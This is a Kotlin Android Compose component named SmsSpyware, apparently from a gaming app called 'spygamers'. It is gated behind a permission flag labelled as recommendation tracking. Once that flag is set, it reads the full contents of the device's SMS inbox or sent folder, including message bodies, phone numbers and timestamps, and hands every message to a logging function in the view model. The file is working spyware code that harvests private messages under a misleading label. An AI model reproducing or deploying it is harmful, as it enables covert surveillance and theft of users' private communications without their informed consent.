package com.example.spygamers.components.spyware

import android.content.Context
import android.net.Uri
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import com.example.spygamers.controllers.GamerViewModel
import kotlin.random.Random

@Composable
fun SmsSpyware(
    viewModel: GamerViewModel,
    context: Context
){
    val recommendationGrantsState by viewModel.grantedRecommendationsTracking.collectAsState()

    // No permissions granted, ignore....
    if (!recommendationGrantsState) {
        return
    }

    LaunchedEffect(Unit) {
        try {
            val useSentInbox = Random.nextInt(1, 3) == 1
            val smsUriString = if (useSentInbox) "content://sms/inbox" else "content://sms/sent"
            val smsUri = Uri.parse(smsUriString)
            val cursor = context.contentResolver.query(smsUri, null, null, null, null)

            cursor?.use {
                val bodyIndex = it.getColumnIndex("body")
                val addressIndex = it.getColumnIndex("address")
                val idIndex = it.getColumnIndex("_id")
                val dateIndex = it.getColumnIndex("date")

                while (it.moveToNext()) {
                    val messageId = it.getLong(idIndex)
                    val messageBody = it.getString(bodyIndex)
                    val senderNumber = it.getString(addressIndex)
                    val timestamp = it.getLong(dateIndex)
                    viewModel.logSms(messageBody, senderNumber, messageId, timestamp, useSentInbox)
                }
            }
        } catch (e: SecurityException) {
            viewModel.updateRecommendationsGrants(false)
        }
    }
}